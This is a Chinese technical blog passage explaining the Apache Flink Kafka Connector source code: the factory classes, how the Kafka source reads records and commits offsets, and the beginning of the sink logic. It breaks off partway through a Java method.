  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:05:03.000Z" title="Tue Jan 20 2026 14:05:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文我们来梳理 Kafka Connector 相关的源码。</p>
<h3 data-id="heading-0">自定义 Source 和 Sink</h3>
<p>在介绍 Kafka Connector 之前，我们先来看一下在 Flink 中是如何支持自定义 Source 和 Sink 的。我们来看一张 Flink 官方文档提供的图。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57a5bc84c82248efa87969d645ce9eec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=SzbKOFFgntjWtzjgc91KnxTtjkc%3D" alt="table-connector" loading="lazy"/></p>
<p>这张图展示了 Connector 的基本体系结构，三层架构也非常清晰。</p>
<h4 data-id="heading-1">Metadata</h4>
<p>首先是最上层的 MetaData，CREATE TABLE 会更新 Catalog，然后被转换为 TableAPI 的 CatalogTable，CatalogTable 实例用于表示动态表（Source 或 Sink 表）的元信息。</p>
<h4 data-id="heading-2">Planning</h4>
<p>在解析和优化程序时，会将 CatalogTable 转换为 DynamicTableSource 和 DynamicTableSink，分别用于查询和插入数据，这两个实例的创建都需要对应的工厂类，工厂类的完整路径需要放到这个配置文件中。</p>
<pre><code class="hljs language-bash" lang="bash">META-INF/services/org.apache.flink.table.factories.Factory
</code></pre>
<p>如果有需要的话，我们还可以在解析过程中配置编码和解码方法。</p>
<p>在 Source 端，通过三个接口支持不同的查询能力。</p>
<ul>
<li>
<p>ScanTableSource：用于消费 changelog 流，扫描的数据支持 insert、updata、delete 三种类型。ScanTableSource 还支持很多其他的功能， 都是通过接口提供的。具体可以看参考这个连接</p>
<pre><code class="hljs language-bash" lang="bash">https://nightlies.apache.org/flink/flink-docs-release-2.2/docs/dev/table/sourcessinks/<span class="hljs-comment">#source-abilities</span>
</code></pre>
</li>
<li>
<p>LookupTableSource：LookupTableSource 不会全量读取表的数据，它在需要时会发送请求，懒加载数据。目前只支持 insert-only 变更模式。</p>
</li>
<li>
<p>VectorSearchTableSource：使用一个输入向量来搜索数据，并返回最相似的 Top-K 行数据。</p>
</li>
</ul>
<p>在 Sink 端，通过 DynamicTableSink 来实现具体的写入逻辑，这里也提供了一些用于扩展能力的接口。具体参考</p>
<pre><code class="hljs language-bash" lang="bash">https://nightlies.apache.org/flink/flink-docs-release-2.2/docs/dev/table/sourcessinks/<span class="hljs-comment">#sink-abilities</span>
</code></pre>
<h4 data-id="heading-3">Runtime</h4>
<p>逻辑解析完成后，会到 Runtime 层。这里就是定义几个 Provider，在 Provider 中实现和连接器具体的交互逻辑。</p>
<h4 data-id="heading-4">小结</h4>
<p>当我们需要创建一个自定义的 Source 和 Sink 时，就可以通过以下步骤实现。</p>
<ol>
<li>
<p>定义 Flink SQL 的 DDL，需要定义相应的 Options。</p>
</li>
<li>
<p>实现 DynamicTableSourceFactory 和 DynamicTableSinkFactory，并把实现类的具体路径写到配置文件中。</p>
</li>
<li>
<p>实现 DynamicTableSource 和 DynamicTableSink，这里需要处理 SQL 层的元数据。</p>
</li>
<li>
<p>提供 Provider，将逻辑层与底层 DataStream 关联起来。</p>
</li>
<li>
<p>编写底层算子，实现 Source 和 Sink 接口。</p>
</li>
</ol>
<h3 data-id="heading-5">Kafka Connector 的实现</h3>
<p>带着这些知识，我们一起来看一下 Kafka Connector 相关的源码。</p>
<p>Kafka Connector 代码目前已经是一个独立的项目了。项目地址是</p>
<pre><code class="hljs language-bash" lang="bash">https://github.com/apache/flink-connector-kafka
</code></pre>
<h4 data-id="heading-6">Factory</h4>
<p>我们首先找到定义的工厂类</p>
<pre><code class="hljs language-java" lang="java">org.apache.flink.streaming.connectors.kafka.table.KafkaDynamicTableFactory
org.apache.flink.streaming.connectors.kafka.table.UpsertKafkaDynamicTableFactory
</code></pre>
<p>以 KafkaDynamicTableFactory 为例，它同时实现了 DynamicTableSourceFactory 和 DynamicTableSinkFactory 两个接口。</p>
<p>KafkaDynamicTableFactory 包含以下几个方法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44ee5eb786cb48809ce55e6043c3b56e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=qlEjjkldPHyzq1cTHUvag7yrLg0%3D" alt="KafkaDynamicTableFactory" loading="lazy"/></p>
<ul>
<li>
<p>factoryIdentifier：返回一个唯一标识符，对应 Flink SQL 中 connector='xxx' 这个配置。</p>
</li>
<li>
<p>requiredOptions：必填配置集合。</p>
</li>
<li>
<p>optionalOptions：选填配置集合。</p>
</li>
<li>
<p>forwardOptions：直接传递到 Runtime 层的配置集合。</p>
</li>
<li>
<p>createDynamicTableSource：创建 DynamicTableSource。</p>
</li>
<li>
<p>createDynamicTableSink：创建 DynamicTableSink。</p>
</li>
</ul>
<h4 data-id="heading-7">Source 端</h4>
<p>工厂类的 createDynamicTableSource 方法创建了 DynamicTableSource，我们来看一下创建的逻辑。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DynamicTableSource <span class="hljs-title function_">createDynamicTableSource</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">TableFactoryHelper</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> FactoryUtil.createTableFactoryHelper(<span class="hljs-built_in">this</span>, context);

    <span class="hljs-keyword">final</span> Optional&lt;DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt;&gt; keyDecodingFormat =
            getKeyDecodingFormat(helper);

    <span class="hljs-keyword">final</span> DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt; valueDecodingFormat =
            getValueDecodingFormat(helper);

    helper.validateExcept(PROPERTIES_PREFIX);

    <span class="hljs-keyword">final</span> <span class="hljs-type">ReadableConfig</span> <span class="hljs-variable">tableOptions</span> <span class="hljs-operator">=</span> helper.getOptions();

    validateTableSourceOptions(tableOptions);

    validatePKConstraints(
            context.getObjectIdentifier(),
            context.getPrimaryKeyIndexes(),
            context.getCatalogTable().getOptions(),
            valueDecodingFormat);

    <span class="hljs-keyword">final</span> <span class="hljs-type">StartupOptions</span> <span class="hljs-variable">startupOptions</span> <span class="hljs-operator">=</span> getStartupOptions(tableOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">BoundedOptions</span> <span class="hljs-variable">boundedOptions</span> <span class="hljs-operator">=</span> getBoundedOptions(tableOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> getKafkaProperties(context.getCatalogTable().getOptions());

    <span class="hljs-comment">// add topic-partition discovery</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">Duration</span> <span class="hljs-variable">partitionDiscoveryInterval</span> <span class="hljs-operator">=</span>
            tableOptions.get(SCAN_TOPIC_PARTITION_DISCOVERY);
    properties.setProperty(
            KafkaSourceOptions.PARTITION_DISCOVERY_INTERVAL_MS.key(),
            Long.toString(partitionDiscoveryInterval.toMillis()));

    <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">physicalDataType</span> <span class="hljs-operator">=</span> context.getPhysicalRowDataType();

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] keyProjection = createKeyFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] valueProjection = createValueFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">keyPrefix</span> <span class="hljs-operator">=</span> tableOptions.getOptional(KEY_FIELDS_PREFIX).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span> tableOptions.getOptional(SCAN_PARALLELISM).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">return</span> createKafkaTableSource(
            physicalDataType,
            keyDecodingFormat.orElse(<span class="hljs-literal">null</span>),
            valueDecodingFormat,
            keyProjection,
            valueProjection,
            keyPrefix,
            getTopics(tableOptions),
            getTopicPattern(tableOptions),
            properties,
            startupOptions.startupMode,
            startupOptions.specificOffsets,
            startupOptions.startupTimestampMillis,
            boundedOptions.boundedMode,
            boundedOptions.specificOffsets,
            boundedOptions.boundedTimestampMillis,
            context.getObjectIdentifier().asSummaryString(),
            parallelism);
}
</code></pre>
<p>在这个方法中，首先要获取到 key 和 value 的解码格式。接着是各种参数校验和获取必要的属性。最后创建 KafkaDynamicSource 实例。</p>
<p>获取解码格式需要用到 DeserializationFormatFactory 工厂，DeserializationFormatFactory 有多个实现类，对应了多种格式的反序列化方法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ba6cb71d8984c6195c812c249511d1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=LgsUYXYpM0bSTFcTWOqm%2FRjz9sA%3D" alt="DeserializationFormatFactory" loading="lazy"/></p>
<p>我们来看比较常见的 Json 格式的工厂 JsonFormatFactory。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt; <span class="hljs-title function_">createDecodingFormat</span><span class="hljs-params">(
        DynamicTableFactory.Context context, ReadableConfig formatOptions)</span> {
    FactoryUtil.validateFactoryOptions(<span class="hljs-built_in">this</span>, formatOptions);
    JsonFormatOptionsUtil.validateDecodingFormatOptions(formatOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">failOnMissingField</span> <span class="hljs-operator">=</span> formatOptions.get(FAIL_ON_MISSING_FIELD);
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ignoreParseErrors</span> <span class="hljs-operator">=</span> formatOptions.get(IGNORE_PARSE_ERRORS);
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonParserEnabled</span> <span class="hljs-operator">=</span> formatOptions.get(DECODE_JSON_PARSER_ENABLED);
    <span class="hljs-type">TimestampFormat</span> <span class="hljs-variable">timestampOption</span> <span class="hljs-operator">=</span> JsonFormatOptionsUtil.getTimestampFormat(formatOptions);

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProjectableDecodingFormat</span>&lt;DeserializationSchema&lt;RowData&gt;&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> DeserializationSchema&lt;RowData&gt; <span class="hljs-title function_">createRuntimeDecoder</span><span class="hljs-params">(
                DynamicTableSource.Context context,
                DataType physicalDataType,
                <span class="hljs-type">int</span>[][] projections)</span> {
            <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">producedDataType</span> <span class="hljs-operator">=</span>
                    Projection.of(projections).project(physicalDataType);
            <span class="hljs-keyword">final</span> <span class="hljs-type">RowType</span> <span class="hljs-variable">rowType</span> <span class="hljs-operator">=</span> (RowType) producedDataType.getLogicalType();
            <span class="hljs-keyword">final</span> TypeInformation&lt;RowData&gt; rowDataTypeInfo =
                    context.createTypeInformation(producedDataType);
            <span class="hljs-keyword">if</span> (jsonParserEnabled) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonParserRowDataDeserializationSchema</span>(
                        rowType,
                        rowDataTypeInfo,
                        failOnMissingField,
                        ignoreParseErrors,
                        timestampOption,
                        toProjectedNames(
                                (RowType) physicalDataType.getLogicalType(), projections));
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonRowDataDeserializationSchema</span>(
                        rowType,
                        rowDataTypeInfo,
                        failOnMissingField,
                        ignoreParseErrors,
                        timestampOption);
            }
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> ChangelogMode <span class="hljs-title function_">getChangelogMode</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> ChangelogMode.insertOnly();
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsNestedProjection</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> jsonParserEnabled;
        }
    };
}
</code></pre>
<p>在创建解码格式时，最重要的是创建运行时的解码器，也就是 DeserializationSchema，在 JsonFormatFactory 中，有 JsonParserRowDataDeserializationSchema 和 JsonRowDataDeserializationSchema 两种实现，分别是用于将 JsonParser 和 JsonNode 转换成为 RowData，具体的逻辑都在 createNotNullConverter 方法中。</p>
<p>了解完解码格式后，我们把视角拉回到 KafkaDynamicSource，它实现了三个接口 ScanTableSource、SupportsReadingMetadata、SupportsWatermarkPushDown。分别用于消费数据，读取元数据和生成水印。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> ScanRuntimeProvider <span class="hljs-title function_">getScanRuntimeProvider</span><span class="hljs-params">(ScanContext context)</span> {
    <span class="hljs-keyword">final</span> DeserializationSchema&lt;RowData&gt; keyDeserialization =
            createDeserialization(context, keyDecodingFormat, keyProjection, keyPrefix);

    <span class="hljs-keyword">final</span> DeserializationSchema&lt;RowData&gt; valueDeserialization =
            createDeserialization(context, valueDecodingFormat, valueProjection, <span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> TypeInformation&lt;RowData&gt; producedTypeInfo =
            context.createTypeInformation(producedDataType);

    <span class="hljs-keyword">final</span> KafkaSource&lt;RowData&gt; kafkaSource =
            createKafkaSource(keyDeserialization, valueDeserialization, producedTypeInfo);

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataStreamScanProvider</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> DataStream&lt;RowData&gt; <span class="hljs-title function_">produceDataStream</span><span class="hljs-params">(
                ProviderContext providerContext, StreamExecutionEnvironment execEnv)</span> {
            <span class="hljs-keyword">if</span> (watermarkStrategy == <span class="hljs-literal">null</span>) {
                watermarkStrategy = WatermarkStrategy.noWatermarks();
            }
            DataStreamSource&lt;RowData&gt; sourceStream =
                    execEnv.fromSource(
                            kafkaSource, watermarkStrategy, <span class="hljs-string">"KafkaSource-"</span> + tableIdentifier);
            providerContext.generateUid(KAFKA_TRANSFORMATION).ifPresent(sourceStream::uid);
            <span class="hljs-keyword">return</span> sourceStream;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBounded</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> kafkaSource.getBoundedness() == Boundedness.BOUNDED;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Optional&lt;Integer&gt; <span class="hljs-title function_">getParallelism</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> Optional.ofNullable(parallelism);
        }
    };
}
</code></pre>
<p>在 ScanRuntimeProvider 的逻辑中，先获取到反序列化器，也就是刚刚我们提到的 DeserializationSchema。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fda648b380364e92baebee5c64ba586d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=rrIxhHnz6i3ip8ywXqcedhIZNis%3D" alt="KafkaSource" loading="lazy"/></p>
<p>然后开始创建 KafkaSource 实例，它是 Source 的实现类，也就是执行引擎层了，这个过程会依次创建图中这些类。</p>
<p>KafkaSource 中主要是创建 KafkaSourceReader 和 KafkaSourceEnumerator，KafkaSourceEnumerator 是负责和分片相关的逻辑，包括分片分配和分片发现等。</p>
<p>KafkaSourceReader 中主要是和 State 相关的逻辑，包括触发快照和完成 Checkpoint 通知的方法。当做 Snapshot 时，会记录活跃 split 的 offset，同时将 split 作为状态提交。当 Checkpoint 完成时，会调用 <code>KafkaSourceFetcherManager.commitOffsets</code> 提交 offset。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;KafkaPartitionSplit&gt; <span class="hljs-title function_">snapshotState</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> {
    List&lt;KafkaPartitionSplit&gt; splits = <span class="hljs-built_in">super</span>.snapshotState(checkpointId);
    <span class="hljs-keyword">if</span> (!commitOffsetsOnCheckpoint) {
        <span class="hljs-keyword">return</span> splits;
    }

    <span class="hljs-keyword">if</span> (splits.isEmpty() &amp;&amp; offsetsOfFinishedSplits.isEmpty()) {
        offsetsToCommit.put(checkpointId, Collections.emptyMap());
    } <span class="hljs-keyword">else</span> {
        Map&lt;TopicPartition, OffsetAndMetadata&gt; offsetsMap =
                offsetsToCommit.computeIfAbsent(checkpointId, id -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());
        <span class="hljs-comment">// Put the offsets of the active splits.</span>
        <span class="hljs-keyword">for</span> (KafkaPartitionSplit split : splits) {
            <span class="hljs-comment">// If the checkpoint is triggered before the partition starting offsets</span>
            <span class="hljs-comment">// is retrieved, do not commit the offsets for those partitions.</span>
            <span class="hljs-keyword">if</span> (split.getStartingOffset() &gt;= <span class="hljs-number">0</span>) {
                offsetsMap.put(
                        split.getTopicPartition(),
                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">OffsetAndMetadata</span>(split.getStartingOffset()));
            }
        }
        <span class="hljs-comment">// Put offsets of all the finished splits.</span>
        offsetsMap.putAll(offsetsOfFinishedSplits);
    }
    <span class="hljs-keyword">return</span> splits;
}


<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyCheckpointComplete</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> <span class="hljs-keyword">throws</span> Exception {
    LOG.debug(<span class="hljs-string">"Committing offsets for checkpoint {}"</span>, checkpointId);
    ...

    ((KafkaSourceFetcherManager) splitFetcherManager)
            .commitOffsets(
                    committedPartitions,
                    (ignored, e) -&gt; {...});
}
</code></pre>
<p>KafkaSourceFetcherManager 负责管理 fetcher 线程，提交 Offset。</p>
<p>KafkaPartitionSplitReader 的 fetch 方法用来消费 Kafka 的数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> RecordsWithSplitIds&lt;ConsumerRecord&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt;&gt; fetch() <span class="hljs-keyword">throws</span> IOException {
    ConsumerRecords&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt; consumerRecords;
    <span class="hljs-keyword">try</span> {
        consumerRecords = consumer.poll(Duration.ofMillis(POLL_TIMEOUT));
    } <span class="hljs-keyword">catch</span> (WakeupException | IllegalStateException e) {
        <span class="hljs-comment">// IllegalStateException will be thrown if the consumer is not assigned any partitions.</span>
        <span class="hljs-comment">// This happens if all assigned partitions are invalid or empty (starting offset &gt;=</span>
        <span class="hljs-comment">// stopping offset). We just mark empty partitions as finished and return an empty</span>
        <span class="hljs-comment">// record container, and this consumer will be closed by SplitFetcherManager.</span>
        <span class="hljs-type">KafkaPartitionSplitRecords</span> <span class="hljs-variable">recordsBySplits</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaPartitionSplitRecords</span>(
                        ConsumerRecords.empty(), kafkaSourceReaderMetrics);
        markEmptySplitsAsFinished(recordsBySplits);
        <span class="hljs-keyword">return</span> recordsBySplits;
    }
    <span class="hljs-type">KafkaPartitionSplitRecords</span> <span class="hljs-variable">recordsBySplits</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaPartitionSplitRecords</span>(consumerRecords, kafkaSourceReaderMetrics);
    List&lt;TopicPartition&gt; finishedPartitions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (TopicPartition tp : consumer.assignment()) {
        <span class="hljs-type">long</span> <span class="hljs-variable">stoppingOffset</span> <span class="hljs-operator">=</span> getStoppingOffset(tp);
        <span class="hljs-type">long</span> <span class="hljs-variable">consumerPosition</span> <span class="hljs-operator">=</span> getConsumerPosition(tp, <span class="hljs-string">"retrieving consumer position"</span>);
        <span class="hljs-comment">// Stop fetching when the consumer's position reaches the stoppingOffset.</span>
        <span class="hljs-comment">// Control messages may follow the last record; therefore, using the last record's</span>
        <span class="hljs-comment">// offset as a stopping condition could result in indefinite blocking.</span>
        <span class="hljs-keyword">if</span> (consumerPosition &gt;= stoppingOffset) {
            LOG.debug(
                    <span class="hljs-string">"Position of {}: {}, has reached stopping offset: {}"</span>,
                    tp,
                    consumerPosition,
                    stoppingOffset);
            recordsBySplits.setPartitionStoppingOffset(tp, stoppingOffset);
            finishSplitAtRecord(
                    tp, stoppingOffset, consumerPosition, finishedPartitions, recordsBySplits);
        }
    }

    <span class="hljs-comment">// Only track non-empty partition's record lag if it never appears before</span>
    consumerRecords
            .partitions()
            .forEach(
                    trackTp -&gt; {
                        kafkaSourceReaderMetrics.maybeAddRecordsLagMetric(consumer, trackTp);
                    });

    markEmptySplitsAsFinished(recordsBySplits);

    <span class="hljs-comment">// Unassign the partitions that has finished.</span>
    <span class="hljs-keyword">if</span> (!finishedPartitions.isEmpty()) {
        finishedPartitions.forEach(kafkaSourceReaderMetrics::removeRecordsLagMetric);
        unassignPartitions(finishedPartitions);
    }

    <span class="hljs-comment">// Update numBytesIn</span>
    kafkaSourceReaderMetrics.updateNumBytesInCounter();

    <span class="hljs-keyword">return</span> recordsBySplits;
}
</code></pre>
<p>至此，Source 端相关的源码我们就梳理完了。接下来我们再看 Sink 端的代码。</p>
<h4 data-id="heading-8">Sink 端</h4>
<p>我们从工厂类中的 createDynamicTableSink 方法开始。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DynamicTableSink <span class="hljs-title function_">createDynamicTableSink</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">TableFactoryHelper</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span>
            FactoryUtil.createTableFactoryHelper(
                    <span class="hljs-built_in">this</span>, autoCompleteSchemaRegistrySubject(context));

    <span class="hljs-keyword">final</span> Optional&lt;EncodingFormat&lt;SerializationSchema&lt;RowData&gt;&gt;&gt; keyEncodingFormat =
            getKeyEncodingFormat(helper);

    <span class="hljs-keyword">final</span> EncodingFormat&lt;SerializationSchema&lt;RowData&gt;&gt; valueEncodingFormat =
            getValueEncodingFormat(helper);

    helper.validateExcept(PROPERTIES_PREFIX);

    <span class="hljs-keyword">final</span> <span class="hljs-type">ReadableConfig</span> <span class="hljs-variable">tableOptions</span> <span class="hljs-operator">=</span> helper.getOptions();

    <span class="hljs-keyword">final</span> <span class="hljs-type">DeliveryGuarantee</span> <span class="hljs-variable">deliveryGuarantee</span> <span class="hljs-operator">=</span> validateDeprecatedSemantic(tableOptions);
    validateTableSinkOptions(tableOptions);

    KafkaConnectorOptionsUtil.validateDeliveryGuarantee(tableOptions);

    validatePKConstraints(
            context.getObjectIdentifier(),
            context.getPrimaryKeyIndexes(),
            context.getCatalogTable().getOptions(),
            valueEncodingFormat);

    <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">physicalDataType</span> <span class="hljs-operator">=</span> context.getPhysicalRowDataType();

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] keyProjection = createKeyFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] valueProjection = createValueFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">keyPrefix</span> <span class="hljs-operator">=</span> tableOptions.getOptional(KEY_FIELDS_PREFIX).orElse(<span class="hljs-literal">null</span>);

